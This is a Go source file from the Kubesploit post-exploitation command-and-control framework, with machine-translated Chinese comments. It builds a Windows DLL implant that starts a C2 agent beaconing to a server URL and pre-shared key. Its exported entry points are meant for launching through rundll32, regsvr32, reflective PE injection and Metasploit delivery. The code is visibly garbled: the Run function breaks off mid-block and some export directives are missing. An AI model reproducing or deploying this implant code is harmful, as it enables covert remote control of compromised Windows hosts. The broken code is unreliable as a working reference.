# `kubesploit\cmd\merlinagentdll\main.go`

```
// +build windows,cgo
// 指定该文件在 Windows 系统下使用 cgo 构建

// Kubesploit is a post-exploitation command and control framework built on top of Merlin by Russel Van Tuyl.
// This file is part of Kubesploit.
// Kubesploit 是基于 Russel Van Tuyl 的 Merlin 构建的后渗透命令和控制框架。
// 本文件是 Kubesploit 的一部分。

// Copyright (c) 2021 CyberArk Software Ltd. All rights reserved.
// 版权所有 2021 CyberArk Software Ltd.

// Kubesploit is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
// Kubesploit 是自由软件：您可以根据自由软件基金会发布的 GNU 通用公共许可证的条款重新分发和/或修改它，无论是许可证的第 3 版还是任何后续版本。

// Kubesploit is distributed in the hope that it will be useful for enhancing organizations' security.
// Kubesploit 希望能够有助于增强组织的安全性。
// Kubesploit shall not be used in any malicious manner.
// Kubesploit 不得以任何恶意方式使用。
// Kubesploit is distributed AS-IS, WITHOUT ANY WARRANTY; including the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
// Kubesploit 按原样分发，不附带任何保证；包括但不限于适销性或特定用途的隐含保证。详细信息请参阅 GNU 通用公共许可证。

// You should have received a copy of the GNU General Public License
// along with Kubesploit.  If not, see <http://www.gnu.org/licenses/>.
// 您应该已经收到了 GNU 通用公共许可证的副本，连同 Kubesploit 一起。如果没有，请访问 <http://www.gnu.org/licenses/>。
package main

import (
	"C"  // 导入 C 语言的包
	"os"  // 导入操作系统相关的包
	"strings"  // 导入字符串处理相关的包

	// 导入自定义的 Merlin 包
	"kubesploit/pkg/agent"
)

var url = "https://127.0.0.1:443"  // 定义变量 url，并赋值为指定的 URL
var psk = "merlin"  // 定义变量 psk，并赋值为 "merlin"
var proxy = ""  // 定义变量 proxy，并赋空值
var host = ""  // 定义变量 host，并赋空值
var ja3 = ""  // 定义变量 ja3，并赋空值

func main() {}  // 主函数，程序入口

// run is a private function called by exported functions to instantiate/execute the Agent
// run 是一个私有函数，由导出的函数调用以实例化/执行 Agent
// run 函数用于执行指定 URL 的 agent
func run(URL string) {
    // 创建一个新的 agent 对象，使用指定的参数
    a, err := agent.New("h2", URL, host, psk, proxy, ja3, false, false)
    // 如果创建 agent 对象出现错误，退出程序
    if err != nil {
        os.Exit(1)
    }
    // 运行 agent 对象，如果出现错误，退出程序
    errRun := a.Run()
    if errRun != nil {
        os.Exit(1)
    }
}

// EXPORTED FUNCTIONS

//export Run
// Run 函数设计用于与 rundll32.exe 一起执行 Merlin agent。
// 该函数将处理第 3 个位置的命令行参数，用于可选的连接 URL
func Run() {
    // 如果使用 rundll32，位置 0 是 "rundll32"，位置 1 是 "merlin.dll,Run"
    if len(os.Args) >= 3 {
        if strings.HasPrefix(strings.ToLower(os.Args[0]), "rundll32") {
// 从命令行参数中获取 URL，并运行主函数
url = os.Args[2]

// 导出的 VoidFunc 函数，用于 PowerSploit 的 Invoke-ReflectivePEInjection.ps1
func VoidFunc() { run(url) }

// 导出的 DllInstall 函数，用于使用 regsvr32.exe 执行 Merlin 代理
// TODO 添加支持通过 /i:"https://192.168.1.100:443" merlin.dll 传递 Merlin 服务器 URL
func DllInstall() { run(url) }

// 导出的 DllRegisterServer 函数，用于使用 regsvr32.exe 执行 Merlin 代理
func DllRegisterServer() { run(url) }
// 导出 DllUnregisterServer
// 当使用 regsvr32.exe 执行 Merlin 代理时使用 DLLUnregisterServer（即 regsvr32.exe /s /u merlin.dll）
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
func DllUnregisterServer() { run(url) }

// 导出 Merlin
// Merlin 是一个导出函数，接受一个 C *char，将其转换为字符串，并执行它。
// 用于 DLL 加载
func Merlin(u *C.char) {
	if len(C.GoString(u)) > 0 {
		url = C.GoString(u)
	}
	run(url)
}

// TODO 添加入口点 0（是的，是零）以便与 Metasploit 的 windows/smb/smb_delivery 一起使用
// TODO 将导出函数移动到 merlin.c 中以正确处理它们，并只导出 Run()
```